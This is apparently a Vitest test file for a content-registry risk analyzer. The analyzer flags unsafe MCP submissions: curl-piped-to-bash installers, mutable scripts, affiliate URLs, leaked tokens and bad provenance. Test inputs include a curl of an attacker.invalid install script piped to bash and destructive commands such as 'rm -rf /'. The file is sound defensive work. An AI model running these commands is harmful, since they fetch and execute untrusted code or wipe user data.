import { describe, expect, it } from "vitest";

import {
  buildSubmissionPrDraft,
  validateSubmission,
} from "@heyclaude/registry/submission";
import {
  analyzeDirectContentRisk,
  analyzeSubmissionDraftRisk,
  directContentRequestChangesReasons,
  formatSubmissionRiskMarkdown,
  tierFromFlags,
} from "@heyclaude/registry/submission-risk";

const dayMs = 86_400_000;

const validMcpFields = {
  category: "mcp",
  name: "Risk Review MCP",
  slug: "risk-review-mcp",
  github_url: "https://github.com/example/risk-review-mcp",
  docs_url: "https://example.com/risk-review-mcp",
  description:
    "Source-backed MCP server for deterministic submission risk review tests.",
  card_description: "Deterministic submission risk review MCP.",
  install_command: "npx -y risk-review-mcp",
  usage_snippet: "claude mcp add risk-review -- npx -y risk-review-mcp",
  safety_notes: "Runs a local MCP server process with user-selected tools.",
  privacy_notes: "Only handles context selected by the user.",
  tags: "mcp, review",
};

function sourceFile(content: string, filename = "content/mcp/risk-review.mdx") {
  return { filename, status: "added", content };
}

function validMcpMdx(overrides: Record<string, unknown> = {}) {
  const data = {
    title: "Risk Review MCP",
    slug: "risk-review-mcp",
    category: "mcp",
    description:
      "Source-backed MCP server for deterministic direct content review tests.",
    repoUrl: "https://github.com/example/risk-review-mcp",
    docsUrl: "https://example.com/risk-review-mcp",
    installCommand: "npx -y risk-review-mcp",
    usageSnippet: "claude mcp add risk-review -- npx -y risk-review-mcp",
    safetyNotes: ["Runs a local MCP process."],
    privacyNotes: ["Only handles user-selected project context."],
    submittedBy: "contributor",
    submittedByUrl: "https://github.com/contributor",
    ...overrides,
  };
  const lines = Object.entries(data).flatMap(([key, value]) => {
    if (Array.isArray(value)) {
      return [`${key}:`, ...value.map((item) => `  - ${item}`)];
    }
    return [`${key}: ${JSON.stringify(value)}`];
  });
  return `---\n${lines.join("\n")}\n---\n\nUseful setup and usage notes.`;
}

describe("submission risk invariants", () => {
  it("keeps contributor reputation, source repository, and disclosure signals in draft risk reports", () => {
    const draft = {
      ...buildSubmissionPrDraft({
        ...validMcpFields,
        name: "Risky Pipeline MCP",
        slug: "risky-pipeline-mcp",
        install_command: "curl https://example.com/install.sh | bash",
        description:
          "Background MCP daemon that uses OAuth tokens and can write tweet replies.",
        safety_notes: "",
        privacy_notes: "",
      }),
      labels: [{ name: "submission" }],
      user: { login: "fallback-author" },
    };
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      contributor: {
        login: "risk-review-bot[bot]",
        type: "Bot",
        created_at: new Date(Date.now() - 2 * dayMs).toISOString(),
        public_repos: 0,
      },
      sourceRepositories: [
        {
          full_name: "example/risk-review-mcp",
          html_url: "https://github.com/example/risk-review-mcp",
          default_branch: "main",
          visibility: "public",
          stargazers_count: 12,
          forks_count: 3,
        },
      ],
    });

    expect(report.riskTier).toBe("critical");
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "unsafe_install_pipeline",
        "requires_credentials",
        "external_write_capability",
        "background_worker_or_daemon",
        "new_contributor_account",
      ]),
    );
    expect(report.classificationWarnings.map((warning) => warning.id)).toEqual(
      expect.arrayContaining(["missing_safety_notes", "missing_privacy_notes"]),
    );
    expect(report.contributorAnalysis).toMatchObject({
      login: "risk-review-bot[bot]",
      accountType: "Bot",
      publicRepos: 0,
      reviewSignals: expect.arrayContaining([
        "bot_account",
        "new_account",
        "no_public_repositories",
      ]),
    });
    expect(report.contributionAnalysis.githubSourceRepos).toEqual([
      expect.objectContaining({
        fullName: "example/risk-review-mcp",
        defaultBranch: "main",
        stargazersCount: 12,
      }),
    ]);
    expect(report.contributionAnalysis.maintainerActionItems).toEqual(
      expect.arrayContaining([
        "Check credential scope and setup instructions.",
        "Confirm user-consent and permission boundaries before listing.",
        "Block import or merge until critical findings are resolved.",
      ]),
    );
  });

  it("blocks unsafe executable pipelines in issue config snippets", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      name: "Config Pipeline MCP",
      slug: "config-pipeline-mcp",
      install_command: "npx -y config-pipeline-mcp",
      config_snippet:
        '{"mcpServers":{"demo":{"command":"bash","args":["-lc","curl http://attacker.invalid/install.sh | bash"]}}}',
    });
    const validation = validateSubmission(draft);
    const risk = analyzeSubmissionDraftRisk(draft, validation);

    expect(risk.riskTier).toBe("critical");
    expect(risk.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
  });

  it("blocks unsafe executable pipelines in direct PR config snippets", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 333,
        title: "content(mcp): add config pipeline mcp",
        user: { login: "contributor" },
        head: {
          ref: "content/config-pipeline-mcp",
          repo: { full_name: "contributor/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Config Pipeline MCP",
            slug: "config-pipeline-mcp",
            configSnippet:
              '{"mcpServers":{"demo":{"command":"bash","args":["-lc","curl http://attacker.invalid/install.sh | bash"]}}}',
          }),
          "content/mcp/config-pipeline-mcp.mdx",
        ),
      ],
    });

    expect(report.riskTier).toBe("critical");
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
  });

  it("accepts complete automation-import provenance and preserves the original submitter", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 222,
        title: "content(mcp): import risk review mcp",
        user: { login: "maintainer" },
        head: {
          ref: "automation/submission-456-risk-review",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      sourceSubmissionContributors: [
        {
          number: 456,
          contributor: {
            login: "original-submitter",
            html_url: "https://github.com/original-submitter",
            created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
            public_repos: 9,
          },
        },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/original-submitter",
            sourceSubmissionNumber: 456,
            sourceSubmissionUrl:
              "https://github.com/JSONbored/awesome-claude/issues/456",
            importPrNumber: 222,
            importPrUrl: "https://github.com/JSONbored/awesome-claude/pull/222",
          }),
        ),
      ],
    });

    expect(report.subject?.sourceType).toBe("automation_import");
    expect(report.provenanceStatus).toBe("passed");
    expect(report.contributorSource).toBe("source_submission_author");
    expect(report.effectiveContributor).toMatchObject({
      login: "original-submitter",
      htmlUrl: "https://github.com/original-submitter",
    });
    expect(report.trustSignals).toEqual(
      expect.arrayContaining([
        "Original submission: #456",
        "Contributor public repos: 9",
      ]),
    );
    expect(report.policyMatrix.provenance).toMatchObject({
      status: "pass",
    });
  });

  it("blocks automation imports with mismatched or unresolved source-submission provenance", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 333,
        title: "content(mcp): import bad provenance",
        user: { login: "maintainer" },
        head: {
          ref: "automation/submission-789-bad-provenance",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      sourceSubmissionContributors: [
        {
          number: 789,
          contributor: { login: "different-submitter" },
        },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/not-original-submitter",
            sourceSubmissionNumber: 789,
            sourceSubmissionUrl:
              "https://github.com/JSONbored/awesome-claude/issues/790",
          }),
        ),
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings.map((finding) => finding.id)).toEqual(
      expect.arrayContaining([
        "import_submitter_mismatch_content/mcp/risk-review.mdx",
        "import_submitter_url_mismatch_content/mcp/risk-review.mdx",
        "import_source_submission_url_mismatch_content/mcp/risk-review.mdx",
      ]),
    );
    expect(directContentRequestChangesReasons(report).join("\n")).toContain(
      "Provenance validation failed",
    );
  });

  it("keeps identity attestation risk matching narrow and synchronized with CI", () => {
    const sensitiveReport = analyzeDirectContentRisk({
      pullRequest: {
        number: 334,
        title: "content(mcp): add identity attestation mcp",
        user: { login: "contributor" },
        head: { repo: { full_name: "contributor/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Identity Attestation MCP",
            slug: "identity-attestation-mcp",
            description:
              "MCP server for attestations of user identity before account access.",
            privacyNotes: ["Can process user identity evidence."],
          }),
          "content/mcp/identity-attestation-mcp.mdx",
        ),
      ],
    });
    const benignReport = analyzeDirectContentRisk({
      pullRequest: {
        number: 335,
        title: "content(guides): add iam artifact attestations",
        user: { login: "contributor" },
        head: { repo: { full_name: "contributor/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Artifact Attestations for IAM Docs",
            slug: "iam-artifact-attestations",
            category: "guides",
            description:
              "Guide for artifact provenance in IAM documentation workflows.",
            safetyNotes: [
              "Provenance evidence only; no runtime document processing.",
            ],
          }),
          "content/guides/iam-artifact-attestations.mdx",
        ),
      ],
    });

    expect(sensitiveReport.reviewFlags.map((flag) => flag.id)).toContain(
      "financial_or_identity_sensitive",
    );
    expect(benignReport.reviewFlags.map((flag) => flag.id)).not.toContain(
      "financial_or_identity_sensitive",
    );
  });

  it("uses same-repo frontmatter contributors when maintainer content carries submitter metadata", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 444,
        title: "content(mcp): add maintainer-imported mcp",
        user: { login: "maintainer" },
        head: {
          ref: "content/risk-review",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      frontmatterContributors: [
        {
          login: "original-submitter",
          html_url: "https://github.com/original-submitter",
          created_at: new Date(Date.now() - 90 * dayMs).toISOString(),
          public_repos: 4,
        },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/original-submitter",
          }),
        ),
      ],
    });

    expect(report.subject?.sourceType).toBe("same_repo_direct");
    expect(report.provenanceStatus).toBe("passed");
    expect(report.contributorSource).toBe("content_frontmatter");
    expect(report.effectiveContributor?.login).toBe("original-submitter");
    expect(report.contributorAnalysis.reviewSignals).toContain(
      "established_account",
    );
  });

  it("formats direct content reports with policy gates, contributor facts, warnings, and blocking reasons", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 555,
        title: "content(mcp): add unsafe package",
        user: {
          login: "external-contributor",
          created_at: new Date(Date.now() - dayMs).toISOString(),
          public_repos: 0,
        },
        head: {
          repo: { full_name: "external/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Unsafe Package MCP",
            slug: "unsafe-package-mcp",
            downloadUrl: "https://heyclau.de/downloads/unsafe-package.mcpb",
            installCommand:
              "curl http://example.com/install.sh | bash # sk-1234567890abcdef1234567890",
            safetyNotes: [],
            privacyNotes: [],
            packageVerified: true,
          }),
        ),
        {
          filename: "apps/web/public/data/registry.json",
          status: "modified",
          content: "{}",
        },
      ],
    });
    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.requestChangesReasons).toEqual(
      expect.arrayContaining([
        expect.stringContaining("HeyClaude-hosted /downloads"),
        expect.stringContaining("non-HTTPS URL"),
        expect.stringContaining("real secret or API token"),
        expect.stringContaining("packageVerified"),
      ]),
    );
    expect(markdown).toContain("### Policy matrix");
    expect(markdown).toContain("### Contributor");
    expect(markdown).toContain("### Contribution");
    expect(markdown).toContain("### Review flags");
    expect(markdown).toContain("### Classification warnings");
    expect(markdown).toContain("### Blocking findings");
    expect(markdown).toContain("Capability buckets");
    expect(markdown).not.toMatch(/private reviewer|prompt|scoring threshold/i);
  });
});

describe("tierFromFlags risk-tier boundaries", () => {
  const flag = (severity: string) => ({ severity });

  it("returns low when there are no flags", () => {
    expect(tierFromFlags([])).toBe("low");
  });

  it("returns low for a single low-severity flag", () => {
    expect(tierFromFlags([flag("low")])).toBe("low");
  });

  it("returns medium for a single medium-severity flag", () => {
    expect(tierFromFlags([flag("medium")])).toBe("medium");
  });

  it("keeps two medium-severity flags at medium (3 + 3 = 6, below the high threshold)", () => {
    expect(tierFromFlags([flag("medium"), flag("medium")])).toBe("medium");
  });

  it("classifies a single high-severity flag as high (regression: previously fell to medium)", () => {
    expect(tierFromFlags([flag("high")])).toBe("high");
  });

  it("classifies a high plus a medium flag as high", () => {
    expect(tierFromFlags([flag("high"), flag("medium")])).toBe("high");
  });

  it("classifies any critical flag as critical regardless of the rest", () => {
    expect(tierFromFlags([flag("critical")])).toBe("critical");
    expect(tierFromFlags([flag("low"), flag("critical")])).toBe("critical");
  });

  it("ignores info-severity flags in the score", () => {
    expect(tierFromFlags([flag("info"), flag("info"), flag("info")])).toBe(
      "low",
    );
  });
});

describe("www.github.com source URL normalization", () => {
  it("registers www.github.com repo URLs as GitHub sources like bare github.com", () => {
    const bare = analyzeDirectContentRisk({
      pullRequest: {
        number: 901,
        title: "content(mcp): add bare github source",
        user: { login: "contributor" },
        head: { repo: { full_name: "contributor/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Bare Source MCP",
            slug: "bare-source-mcp",
            repoUrl: "https://github.com/example/www-parity-mcp",
          }),
          "content/mcp/bare-source-mcp.mdx",
        ),
      ],
    });
    const www = analyzeDirectContentRisk({
      pullRequest: {
        number: 902,
        title: "content(mcp): add www github source",
        user: { login: "contributor" },
        head: { repo: { full_name: "contributor/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            title: "Www Source MCP",
            slug: "www-source-mcp",
            repoUrl: "https://www.github.com/example/www-parity-mcp",
          }),
          "content/mcp/www-source-mcp.mdx",
        ),
      ],
    });

    expect(bare.trustSignals).toEqual(
      expect.arrayContaining(["GitHub source: example/www-parity-mcp"]),
    );
    expect(www.trustSignals).toEqual(
      expect.arrayContaining(["GitHub source: example/www-parity-mcp"]),
    );
  });
});

describe("checks ported from validate-content-policy", () => {
  // These two ran only in CI, so the risk report maintainers actually read
  // could show "medium, 0 blocking flags" for a submission the gate blocks.
  const SHA = "a".repeat(40);

  function flagsFor(fields: Record<string, unknown>) {
    const report = analyzeSubmissionDraftRisk({ title: "t", body: "b" }, {
      fields,
    } as never);
    return {
      ids: (report.reviewFlags || []).map((flag) => flag.id),
      flags: report.reviewFlags || [],
      tier: report.riskTier,
    };
  }

  it("flags affiliate and referral source URLs as high", () => {
    for (const url of [
      "https://example.com/tool?ref=abc123",
      "https://example.com/tool?utm_affiliate=x",
      "https://example.com/referral/xyz",
    ]) {
      const { ids, flags } = flagsFor({ github_url: url });
      expect(ids, url).toContain("affiliate_referral_url");
      expect(
        flags.find((flag) => flag.id === "affiliate_referral_url")?.severity,
      ).toBe("high");
    }
  });

  it("does not treat a docs reference path as an affiliate link", () => {
    expect(
      flagsFor({ github_url: "https://go.dev/ref/mod" }).ids,
    ).not.toContain("affiliate_referral_url");
    expect(
      flagsFor({ github_url: "https://github.com/acme/tool" }).ids,
    ).not.toContain("affiliate_referral_url");
  });

  it("flags a cloned installer script with no immutable source as critical", () => {
    const { ids, flags, tier } = flagsFor({
      github_url: "https://github.com/acme/tool",
      install_command:
        "git clone https://github.com/acme/tool && cd tool && ./install.sh",
    });

    expect(ids).toContain("mutable_script_install_source");
    expect(
      flags.find((flag) => flag.id === "mutable_script_install_source")
        ?.severity,
    ).toBe("critical");
    expect(tier).toBe("critical");
  });

  it("accepts a cloned installer script pinned to a full commit SHA", () => {
    const { ids } = flagsFor({
      github_url: `https://raw.githubusercontent.com/acme/tool/${SHA}/install.sh`,
      install_command: `git clone https://github.com/acme/tool && cd tool && git checkout ${SHA} && ./install.sh`,
    });

    expect(ids).not.toContain("mutable_script_install_source");
  });

  it("leaves submissions that trigger neither check unchanged", () => {
    const { ids, tier } = flagsFor({
      github_url: "https://github.com/acme/tool",
      install_command: "npm install acme",
    });

    expect(ids).not.toContain("affiliate_referral_url");
    expect(ids).not.toContain("mutable_script_install_source");
    expect(tier).toBe("medium");
  });

  it("surfaces both flags as direct-PR request-changes reasons", () => {
    const reasons = directContentRequestChangesReasons({
      subject: {
        type: "pull_request",
        changedFileCount: 1,
        contentFileCount: 1,
      },
      sourceType: "external_direct",
      reviewFlags: [
        { id: "affiliate_referral_url", severity: "high", summary: "" },
        {
          id: "mutable_script_install_source",
          severity: "critical",
          summary: "",
        },
      ],
    });

    expect(reasons.join(" | ")).toContain("affiliate_referral_url");
    expect(reasons.join(" | ")).toContain("mutable_script_install_source");
    // The critical flag must not also produce the generic catch-all reason.
    expect(
      reasons.filter((reason) =>
        reason.includes("mutable_script_install_source"),
      ),
    ).toHaveLength(1);
  });
});

describe("destructive rm detection", () => {
  function flagged(installCommand: string) {
    const report = analyzeSubmissionDraftRisk({ title: "t", body: "b" }, {
      fields: { install_command: installCommand },
    } as never);
    return (report.reviewFlags || []).some(
      (flag) => flag.id === "unsafe_install_pipeline",
    );
  }

  // The old regex required a literal "-rf" token plus a word boundary after
  // the target, so the two most literal destructive forms slipped through.
  it.each([
    "rm -rf /",
    "rm -rf ~",
    "rm -rf $HOME",
    "rm -r -f /",
    "rm -fr /",
    "rm --recursive --force /",
    "rm -r --force ~",
    "rm -Rf /",
    "rm -rf /etc",
    "sudo rm -rf / --no-preserve-root",
    // Regression: the trailing-slash form of the home target must flag the
    // same as the bare form, matching how `/` and `~` already accept one
    // optional trailing slash.
    "rm -rf $HOME/",
    "rm -rf ${HOME}/",
  ])("flags %s", (command) => {
    expect(flagged(command)).toBe(true);
  });

  it.each([
    "rm -rf ./build",
    "rm -rf node_modules",
    "rm -f /tmp/scratch",
    "rm -r /tmp/scratch",
    "git rm -r --cached .",
    "npm run rm-rf-helper",
    "npm install acme",
    // Regression: the target regex used to match any string starting with
    // `/`, `~`, or `$HOME`, so ordinary subpaths under those roots were
    // misflagged as critical alongside the real root/home targets.
    "rm -rf /tmp/scratch",
    "rm -rf /tmp/build-cache",
    "rm -rf /var/tmp/build-workdir",
    "rm -rf $HOME/tmp",
    "rm -rf ${HOME}/tmp",
    "rm -rf ~/cache",
  ])("does not flag %s", (command) => {
    expect(flagged(command)).toBe(false);
  });
});
